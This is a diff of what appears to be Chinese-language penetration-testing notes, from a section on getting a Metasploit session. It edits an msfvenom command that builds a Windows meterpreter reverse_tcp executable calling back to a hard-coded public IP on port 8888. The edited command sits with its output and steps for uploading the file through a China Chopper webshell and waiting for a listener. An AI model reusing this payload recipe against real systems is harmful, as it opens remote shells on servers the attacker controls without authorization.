@@ -63,14 +63,11 @@ Windows 目录:     C:\Windows
 ### 0x02 弹出会话到Metasploit
 生成payload，然后用菜刀上传到目标服务器
 ```bash
-$ msfvenom -p windows/meterpreter/reverse_tcp -e x86 LHOST=114.115.123.123 LPORT=8888 -f exe -o aa.exe
-No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No Arch selected, selecting Arch: x86 from the payload
-Skipping invalid encoder x86
+$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=114.115.183.86 LPORT=8888 --platform windows -f exe -o 86.exe   
 No encoder or badchars specified, outputting raw payload
 Payload size: 341 bytes
 Final size of exe file: 73802 bytes
-Saved as: bb.exe
+Saved as: 86.exe
 ```
 msf监听，等待payload执行
 ```
